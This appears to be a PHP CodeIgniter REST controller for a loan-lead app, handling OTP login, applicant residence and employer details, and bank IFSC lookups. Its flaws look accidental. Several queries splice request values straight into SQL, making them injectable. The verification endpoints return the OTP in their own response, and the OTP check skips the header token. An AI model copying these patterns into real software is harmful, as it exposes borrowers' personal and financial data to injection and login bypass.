<?php

// defined('BASEPATH') OR exit('No direct script access allowed');
require APPPATH . 'libraries/REST_Controller.php';
require APPPATH . 'libraries/Format.php';

class LoginController extends REST_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->model('Task_Model', 'Tasks');
        date_default_timezone_set('Asia/Kolkata');
        define('created_on', date('Y-m-d H:i:s'));
        define('updated_on', date('Y-m-d H:i:s'));
    }

    /* Save lead Api */

    public function SaveLead_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("customer_id", "Customer ID", "required|trim");
            $this->form_validation->set_rules("company_id", "Company ID", "required|trim");
            $this->form_validation->set_rules("company_id", "Company ID", "required|trim");
            $this->form_validation->set_rules("product_id", "Product ID", "required|trim");
            $this->form_validation->set_rules("loan_amount", "Loan Amount", "required|trim|numeric|is_natural");
            $this->form_validation->set_rules("obligations", "Obligations", "trim|numeric|is_natural");
            $this->form_validation->set_rules("source", "Lead Source", "required|trim");
            $this->form_validation->set_rules("coordinates", "coordinates", "trim");
            $this->form_validation->set_rules("ip", "IP", "trim");
            $this->form_validation->set_rules("state_id", "State ID", "required|trim|numeric");
            $this->form_validation->set_rules("city", "city", "required|trim");
            $this->form_validation->set_rules("pincode", "Pincode", "required|trim|numeric|min_length[6]|max_length[6]");

            if ($this->form_validation->run() == FALSE) {
                json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $totalLeadsCount = $this->Tasks->gettotalleadsCount('leads');
                $query = $this->db->select('city_code')->where('city', $post['city'])->from('tbl_city')->get();
                $result1 = $query->row();
                $city_code = $result1->city_code;
                $data1 = $this->Tasks->getProductCode($post['product_id']);
                $str = str_pad($totalLeadsCount, 9, '0', STR_PAD_LEFT);

                $applicationNo = 'AP' . '' . $data1[0]['product_code'] . '' . $city_code . '' . $str;
                // $getStateName= getcustId('tbl_state','state_id',$$post['state_id'],'state'){
                $dataleads = array(
                    'customer_id' => $post['customer_id'],
                    'company_id' => $post['company_id'],
                    'product_id' => $post['product_id'],
                    // 'application_no'    => $applicationNo,
                    'loan_amount' => $post['loan_amount'],
                    'term_and_condition' => (strtoupper($post['term_and_condition']) ? $post['term_and_condition'] : ''),
                    'obligations' => ($post['obligations'] ? $post['obligations'] : ''),
                    'state_id' => $post['state_id'],
                    'city' => $post['city'],
                    'pincode' => ($post['pincode'] ? $post['pincode'] : ''),
                    'source' => $post['source'],
                    'ip' => $post['ip'],
                    'coordinates' => ($post['coordinates']) ? $post['coordinates'] : "",
                    'user_type' => ($post['user_type'] ? $post['user_type'] : ''),
                    'utm_source' => ($post['utm_source'] ? $post['utm_source'] : ''),
                    'utm_campaign' => ($post['utm_campaign'] ? $post['utm_campaign'] : ''),
                );

                if ($this->db->insert('leads', $dataleads)) {
                    $lead_id = $this->db->insert_id();

                    $customer_emp = array(
                        'lead_id' => $lead_id,
                        'customer_id' => $post['customer_id'],
                        'company_id' => $post['company_id'],
                        'product_id' => $post['product_id'],
                        'monthly_income' => $post['monthly_income'],
                    );

                    $this->db->insert('customer_employment', $customer_emp);
                    $result_data = array('status' => 1, 'lead_id' => $lead_id, 'message' => 'Leads record Save Successfully.');
                    echo json_encode($result_data);
                    exit;
                } else {
                    $result_data = array('status' => 0, 'message' => 'Failed to save leads your request.');
                    echo json_encode($result_data);
                    exit;
                }
            }
        } else {
            $result_data = array('status' => 0, 'message' => 'Request Failed, Try Again.');
            echo json_encode($result_data);
            exit;
        }
    }

    /* User Verification api */

    public function UserVerification_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("mobile", "Mobile", "required|trim|numeric|is_natural|min_length[10]|max_length[10]|regex_match[/^[0-9]+$/]");
            if ($this->form_validation->run() == FALSE) {
                json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $mobile = $post['mobile'];
                $otp = rand(1000, 9999);
                $data = [
                    "mobile" => $mobile,
                    "otp" => $otp
                ];

                $query = $this->db->select('customer_id')->where('mobile', $mobile)->from('customer')->get();
                if ($query->num_rows() > 0) {
                    $result1 = $query->row();
                    $customer_id = $result1->customer_id;
                    $this->db->where('customer_id', $customer_id)->update('customer', ['otp' => $otp]);
                } else {
                    $last_row = $this->db->select('customer.customer_id')
                        ->from('customer')
                        ->order_by('customer_id', 'desc')
                        ->limit(1)
                        ->get()
                        ->row();
                    $str = preg_replace('/\D/', '', $last_row->customer_id);
                    $customer_id = "FTLC" . str_pad(($str + 1), 6, "0", STR_PAD_LEFT);
                    //$pancard = $mobile;
                    $dataCustomer = array(
                        'customer_id' => $customer_id,
                        'mobile' => $mobile,
                        // 'pancard'       => $pancard,
                        'otp' => $otp,
                        'created_date' => updated_at
                    );
                    $resultCustomer = $this->db->insert('customer', $dataCustomer);
                }
                $this->Tasks->sendOTPForUserRegistrationVerification($data);
                $array = ['Status' => 1, 'Message' => 'Success.', 'customer_id' => $customer_id, 'OTP' => $otp];
                if ($customer_id) {
                    json_encode($this->response($array, REST_Controller::HTTP_OK));
                } else {
                    json_encode($this->response(['Status' => 0, 'Message' => 'Failed.'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //******* Mobile Varification New API ********//
    /* User Verification api */
    public function MobileVerification_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("mobile", "Mobile", "required|trim|numeric|is_natural|min_length[10]|max_length[10]|regex_match[/^[0-9]+$/]");
            if ($this->form_validation->run() == FALSE) {
                json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $mobile = $post['mobile'];
                $otp = rand(1000, 9999);
                $data = [
                    "mobile" => $mobile,
                    "otp" => $otp
                ];

                $query = $this->db->select('customer_id')->where('mobile', $mobile)->from('customer')->get();
                if ($query->num_rows() > 0) {
                    $result1 = $query->row();
                    $customer_id = $result1->customer_id;
                    $this->db->where('customer_id', $customer_id)->update('customer', ['otp' => $otp]);
                } else {
                    $last_row = $this->db->select('customer.customer_id')
                        ->from('customer')
                        ->order_by('customer_id', 'desc')
                        ->limit(1)
                        ->get()
                        ->row();
                    $str = preg_replace('/\D/', '', $last_row->customer_id);
                    $customer_id = "FTLC" . str_pad(($str + 1), 6, "0", STR_PAD_LEFT);
                    $pancard = $mobile;
                    $dataCustomer = array(
                        'customer_id' => $customer_id,
                        'mobile' => $mobile,
                        'pancard' => $pancard,
                        'otp' => $otp,
                        'created_date' => updated_at
                    );
                    $resultCustomer = $this->db->insert('customer', $dataCustomer);
                }
                $this->Tasks->sendOTPForUserRegistrationVerification($data);
                $array = ['Status' => 1, 'Message' => 'Success.', 'customer_id' => $customer_id, 'OTP' => $otp];
                if ($customer_id) {
                    json_encode($this->response($array, REST_Controller::HTTP_OK));
                } else {
                    json_encode($this->response(['Status' => 0, 'Message' => 'Failed.'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    /* Verify OTP Api */

    public function OTPVerify_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }
        //print_r($post); die;
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("mobile", "Mobile", "required|trim|numeric|is_natural|min_length[10]|max_length[10]|regex_match[/^[0-9]+$/]");
            $this->form_validation->set_rules("customer_id", "Customer ID", "required|trim");
            $this->form_validation->set_rules("otp", "OTP", "required|trim|numeric|is_natural|min_length[4]|max_length[4]|regex_match[/^[0-9]+$/]");
            if ($this->form_validation->run() == FALSE) {
                json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $mobile = $post['mobile'];
                $customer_id = $post['customer_id'];
                $otp = $post['otp'];
                $query = $this->db->select('customer_id')->where('mobile', $mobile)->where('customer_id', $customer_id)->where('otp', $otp)->from('customer')->get();

                if ($query->num_rows() > 0) {
                    $result1 = $query->row();
                    $customer_id = $result1->customer_id;
                    json_encode($this->response(['Status' => 1, 'Message' => 'OTP Verified.', 'customer_id' => $customer_id], REST_Controller::HTTP_OK));
                } else {
                    json_encode($this->response(['Status' => 0, 'Message' => 'Invalid OTP. Try Again'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    /* Save lead Api */

    public function qdeAppApplyLoan_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $this->form_validation->set_data($post);

            $this->form_validation->set_rules("monthly_income", "Monthly Income", "required|trim");
            $this->form_validation->set_rules("obligations", "Obligations", "trim");
            $this->form_validation->set_rules("loan_amount", "Loan Amount", "required|trim");
            $this->form_validation->set_rules("tenure", "Tenure", "required|trim");
            $this->form_validation->set_rules("purpose_of_loan", "purpose", "required|trim");
            // $this->form_validation->set_rules("pincode","Pincode","trim|numeric|min_length[6]|max_length[6]");
            $this->form_validation->set_rules("promocode", "Offer Code", "trim");

            if ($this->form_validation->run() == FALSE) {
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing lead reference."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('customer_id,lead_status_id', 'leads', "WHERE lead_id='$lead_id' and (lead_active='1' and lead_deleted='0' )");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                if ($num_rowsleads[0]['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Your application has been moved to next step."], REST_Controller::HTTP_OK));
                }

                $monthly_income = !empty($post['monthly_income']) ? intval($post['monthly_income']) : 0;
                $obligations = !empty($post['obligations']) ? intval($post['obligations']) : 0;
                $loan_amount = !empty($post['loan_amount']) ? intval($post['loan_amount']) : 0;
                $tenure = !empty($post['tenure']) ? intval($post['tenure']) : 0;
                $purpose_of_loan = !empty($post['purpose_of_loan']) ? $post['purpose_of_loan'] : '';
                $promocode = !empty($post['promocode']) ? $post['promocode'] : '';
                $salary_mode = !empty($post['salary_mode']) ? strtoupper($post['salary_mode']) : '';

                $update_lead_data = array(
                    'obligations' => $obligations,
                    'loan_amount' => $loan_amount,
                    'tenure' => $tenure,
                    'purpose' => $purpose_of_loan,
                    'promocode' => $promocode,
                    'updated_on' => created_on
                );

                $res = $this->db->where('lead_id', $lead_id)->update('leads', $update_lead_data);

                if ($res) {


                    $empquery = $this->db->select('id')->where('lead_id', $lead_id)->from('customer_employment')->get();
                    $empquery = $empquery->row();
                    $emp_id = !empty($empquery->id) ? $empquery->id : 0;

                    $customer_emp = array(
                        'lead_id' => $lead_id,
                        'monthly_income' => $monthly_income,
                        'salary_mode' => $salary_mode,
                    );

                    if (empty($emp_id)) {
                        $customer_emp['created_on'] = created_on;
                        $this->db->insert('customer_employment', $customer_emp);
                    } else {
                        $customer_emp['updated_on'] = created_on;
                        $this->db->where('id', $emp_id)->update('customer_employment', $customer_emp);
                    }

                    return json_encode($this->response(['Status' => 1, 'Message' => "Leads record Save Successfully.", 'lead_id' => $lead_id], REST_Controller::HTTP_OK));
                } else {
                    return json_encode($this->response(['Status' => 0, 'Message' => 'Failed to save leads your request.'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //************************** api for residence ********************//
    public function qdeAppCustomerResidenceDetails_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("house_flat_no", "House / Flat / Building No.", "required|trim");
            $this->form_validation->set_rules("locality", "Locality / Colony /Sector / Street", "required|trim");
            $this->form_validation->set_rules("residence_type", "Residence Type", "required|trim");
            $this->form_validation->set_rules("state_id", "State", "required|trim");
            $this->form_validation->set_rules("city_id", "City", "required|trim");
            $this->form_validation->set_rules("pincode", "Pincode", "required|min_length[6]|max_length[6]");

            if ($this->form_validation->run() == FALSE) {

                //echo "if called"; print_r($post);die;
                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                //  echo "=====".$post['lead_id']; die;

                $lead_id = $post['lead_id'];

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing lead reference."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('customer_id,lead_status_id', 'leads', "WHERE lead_id='$lead_id' AND (lead_active='1' AND lead_deleted='0' )");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                if ($num_rowsleads[0]['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Your application has been moved to next step."], REST_Controller::HTTP_OK));
                }

                $house_flat_no = !empty($post['house_flat_no']) ? strtoupper($post['house_flat_no']) : "";
                $locality = !empty($post['locality']) ? strtoupper($post['locality']) : "";
                $landmark = !empty($post['landmark']) ? strtoupper($post['landmark']) : "";
                $state_id = !empty($post['state_id']) ? $post['state_id'] : "";
                $city_id = !empty($post['city_id']) ? $post['city_id'] : "";
                $pincode = !empty($post['pincode']) ? $post['pincode'] : "";
                $alternate_mobile = !empty($post['alternate_mobile']) ? $post['alternate_mobile'] : "";
                $residence_type = !empty($post['residence_type']) ? $post['residence_type'] : "";
                $residence_since = !empty($post['residence_since_year']) ? $post['residence_since_year'] : "";
                $residence_since .= !empty($post['residence_since_month']) ? "-" . $post['residence_since_month'] : "";
                $residence_with_family = !empty($post['residence_with_family']) ? strtoupper($post['residence_with_family']) : "";

                $getStateName = getcustId('master_state', 'm_state_id', $state_id, 'm_state_name');

                $getCityName = getcustId('master_city', 'm_city_id', $city_id, 'm_city_name');

                $update_data_lead_customer = array(
                    'current_house' => $house_flat_no,
                    'current_locality' => $locality,
                    'current_residence_since' => $residence_since,
                    'state_id' => $state_id,
                    'city_id' => $city_id,
                    'current_state' => $getStateName,
                    'current_city' => $getCityName,
                    'cr_residence_pincode' => $pincode,
                    'current_landmark' => $landmark,
                    'current_residence_type' => $residence_type,
                    'current_residing_withfamily' => $residence_with_family,
                    'alternate_mobile' => $alternate_mobile,
                    'updated_at' => created_on
                );

                $this->db->where('customer_lead_id', $lead_id)->update('lead_customer', $update_data_lead_customer);

                $lead_data = array(
                    'state_id' => $state_id,
                    'city_id' => $city_id,
                    'pincode' => $pincode,
                    'updated_on' => created_on
                );

                $this->db->where('lead_id', $lead_id)->update('leads', $lead_data);

                return json_encode($this->response(['Status' => 1, 'Message' => "Residence details saved successfully."], REST_Controller::HTTP_OK));
            }
        } else {
            return json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //*********** Api for Get States *************//
    public function GetState_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $query = $this->db->query("SELECT state_id as id,UPPER(state) as value FROM tbl_state ");
            if ($query->num_rows() > 0) {
                $result1 = $query->result_array();

                json_encode($this->response(['Status' => 1, 'Message' => 'State Founds.', 'data' => $result1], REST_Controller::HTTP_OK));
            } else {
                json_encode($this->response(['Status' => 0, 'Message' => 'No state found'], REST_Controller::HTTP_OK));
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //********* Api for get city on behalf of state id *********//

    public function GetCity_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("state_id", "State Id", "trim");

            if ($this->form_validation->run() == FALSE) {
                json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $state_id = $post['state_id'];

                //$query = $this->db->select('customer_id')->where('mobile', $mobile)->where('customer_id', $customer_id)->where('otp', $otp)->from('customer')->get();
                $query = $this->db->query("SELECT id,UPPER(city) as value FROM `tbl_city` where state_id='$state_id' ");

                if ($query->num_rows() > 0) {
                    $data = $query->result_array();
                    json_encode($this->response(['Status' => 1, 'Message' => 'City Found', 'data' => $data], REST_Controller::HTTP_OK));
                } else {
                    json_encode($this->response(['Status' => 0, 'Message' => 'No City Found'], REST_Controller::HTTP_OK));
                }
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //*********** Api for Get UserTypes *************//
    public function getUserType_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $query = $this->db->query("SELECT master_id as id,UPPER(employer_type) as value FROM lists_of_masters  where employer_type!='-' ");
            if ($query->num_rows() > 0) {
                $result1 = $query->result_array();

                json_encode($this->response(['Status' => 1, 'Message' => 'Employer Type Found.', 'data' => $result1], REST_Controller::HTTP_OK));
            } else {
                json_encode($this->response(['Status' => 0, 'Message' => 'No Employer Type found'], REST_Controller::HTTP_OK));
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    public function getReferenceMasterList_post() {
        $input_data = file_get_contents("php://input");

        $post = $this->security->xss_clean(json_decode($input_data, true));

        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $query = $this->db->query("SELECT master_id as id,UPPER(refrence_details) as value FROM lists_of_masters  where (refrence_details!='-' || refrence_details!='')");

            if ($query->num_rows() > 0) {
                $result1 = $query->result_array();

                json_encode($this->response(['Status' => 1, 'Message' => 'Refrence Type Found.', 'data' => $result1], REST_Controller::HTTP_OK));
            } else {
                json_encode($this->response(['Status' => 0, 'Message' => 'No Refrence Type found'], REST_Controller::HTTP_BAD_REQUEST));
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_BAD_REQUEST));
        }
    }

    //******** Api for get the refrence details **********//
    //*********** Api for Get UserTypes *************//
    public function residenceType_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $query = $this->db->query("SELECT master_id as id,UPPER(residence_type) as value FROM lists_of_masters  where residence_type!='-' ");
            if ($query->num_rows() > 0) {
                $result1 = $query->result_array();

                json_encode($this->response(['Status' => 1, 'Message' => 'Residence Type Found.', 'data' => $result1], REST_Controller::HTTP_OK));
            } else {
                json_encode($this->response(['Status' => 0, 'Message' => 'No Residence Type found'], REST_Controller::HTTP_OK));
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //*********** Api for Get Pupose of loan / End Use *************//
    public function getPupposeOfLoan_post() {
        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $query = $this->db->query("SELECT enduse_id as id,UPPER(enduse_name) as value FROM master_enduse  where (enduse_active='1' and enduse_deleted='0') ");
            if ($query->num_rows() > 0) {
                $result1 = $query->result_array();

                json_encode($this->response(['Status' => 1, 'Message' => 'Pupose of loan Found.', 'data' => $result1], REST_Controller::HTTP_OK));
            } else {
                json_encode($this->response(['Status' => 0, 'Message' => 'No Pupose of loan found'], REST_Controller::HTTP_OK));
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //************** Api for Save Office Address************************//

    public function qdeAppSaveOfficeDetails_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }
        $headers = $this->input->request_headers();

        $token = $this->_token();

        $header_validation = (($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth'])));

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {

            $this->form_validation->set_data($post);

            $this->form_validation->set_rules("emp_name", "Employe Name", "required|trim");
            $this->form_validation->set_rules("shop_no", "Shop / Block / Building No.", "required|trim");
            $this->form_validation->set_rules("locality", "Locality / Colony /Sector / Street", "required|trim");
            $this->form_validation->set_rules("landmark", "Landmark", "trim");
            $this->form_validation->set_rules("pincode", "pincode", "required|min_length[6]|max_length[6]");
            $this->form_validation->set_rules("state_id", "State", "required|trim");
            $this->form_validation->set_rules("city_id", "City", "required|trim");
            $this->form_validation->set_rules("designation", "Designation", "required|trim");
            $this->form_validation->set_rules("department", "Department", "required|trim");
            $this->form_validation->set_rules("emp_type", "Employer Type", "required|trim");

            if ($this->form_validation->run() == FALSE) {

                return json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {

                $lead_id = $post['lead_id'];

                if (empty($lead_id)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Missing lead reference."], REST_Controller::HTTP_OK));
                }

                $num_rowsleads = getnumrowsData('customer_id,lead_status_id', 'leads', "WHERE lead_id='$lead_id' AND (lead_active='1' AND lead_deleted='0' )");

                if (empty($num_rowsleads)) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Application does not exist."], REST_Controller::HTTP_OK));
                }

                if ($num_rowsleads[0]['lead_status_id'] > 1) {
                    return json_encode($this->response(['Status' => 0, 'Message' => "Your application has been moved to next step."], REST_Controller::HTTP_OK));
                }

                $empquery = $this->db->select('id')->where('lead_id', $lead_id)->from('customer_employment')->get();
                $empquery = $empquery->row();
                $emp_id = !empty($empquery->id) ? $empquery->id : 0;

                $emp_name = !empty($post['emp_name']) ? strtoupper($post['emp_name']) : "";
                $shop_no = !empty($post['shop_no']) ? strtoupper($post['shop_no']) : "";
                $locality = !empty($post['locality']) ? strtoupper($post['locality']) : "";
                $landmark = !empty($post['landmark']) ? strtoupper($post['landmark']) : "";
                $department = !empty($post['department']) ? strtoupper($post['department']) : "";
                $designation = !empty($post['designation']) ? strtoupper($post['designation']) : "";
                $website = !empty($post['website']) ? strtoupper($post['website']) : "";
                $email = !empty($post['email']) ? strtoupper($post['email']) : "";
                $state_id = !empty($post['state_id']) ? $post['state_id'] : "";
                $city_id = !empty($post['city_id']) ? $post['city_id'] : "";
                $emp_type = !empty($post['emp_type']) ? $post['emp_type'] : "";
                $pincode = !empty($post['pincode']) ? $post['pincode'] : "";
                $residence_since = !empty($post['residence_since_year']) ? $post['residence_since_year'] : "";
                $residence_since .= !empty($post['residence_since_month']) ? "-" . $post['residence_since_month'] : "";

                $customer_emp = array(
                    'employer_name' => $emp_name,
                    'emp_pincode' => $pincode,
                    'state_id' => $state_id,
                    'city_id' => $city_id,
                    'emp_house' => $shop_no,
                    'emp_shopNo' => $shop_no,
                    'emp_street' => $locality,
                    'emp_locality' => $locality,
                    'emp_landmark' => $landmark,
                    'emp_residence_since' => $residence_since,
                    'emp_designation' => $designation,
                    'emp_department' => $department,
                    'emp_employer_type' => $emp_type,
                    'emp_website' => $website,
                    'emp_email' => $email,
                );

                if (empty($emp_id)) {
                    $customer_emp['created_on'] = created_on;
                    $this->db->insert('customer_employment', $customer_emp);
                } else {
                    $customer_emp['updated_on'] = created_on;
                    $this->db->where('id', $emp_id)->update('customer_employment', $customer_emp);
                }

                return json_encode($this->response(['Status' => 1, 'Message' => "Your office details has been saved successfully."], REST_Controller::HTTP_OK));
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //*********** Api for Get BankDetails from IFSC Code *************//
    public function getbankdetails_post() {

        $input_data = file_get_contents("php://input");
        $post = $this->security->xss_clean(json_decode($input_data, true));
        if ($input_data) {
            $post = $this->security->xss_clean(json_decode($input_data, true));
        } else {
            $post = $this->security->xss_clean($_POST);
        }

        $headers = $this->input->request_headers();
        $token = $this->_token();
        $header_validation = (
            ($headers['Accept'] == "application/json") && ($token['token_Leads'] == base64_decode($headers['Auth']))
        );

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $header_validation) {
            $this->form_validation->set_data($post);
            $this->form_validation->set_rules("ifsc_code", "IFSC Code", "required|trim");

            if ($this->form_validation->run() == FALSE) {
                json_encode($this->response(['Status' => 0, 'Message' => validation_errors()], REST_Controller::HTTP_OK));
            } else {
                $ifsc_code = $post['ifsc_code'];
                $table = 'tbl_bank_details';
                $selectdata = 'UPPER(bank_name) as name,UPPER(bank_branch) as branch';
                $where = "where bank_ifsc like '%$ifsc_code%' ";

                $num_rows = getnumrowsData($selectdata, $table, $where);

                if ($num_rows == '0') {
                    // echo "zewo";
                    $result_data = array('status' => 0, 'message' => 'No record found');
                    echo json_encode($result_data);
                } else {
                    $result_data = array('status' => 1, 'message' => 'IFSC Found', 'data' => $num_rows);
                    echo json_encode($result_data);
                }
            }
        } else {
            json_encode($this->response(['Status' => 0, 'Message' => 'Request Method Post Failed.'], REST_Controller::HTTP_OK));
        }
    }

    //*********** Api for Get all IFSC Code *************//
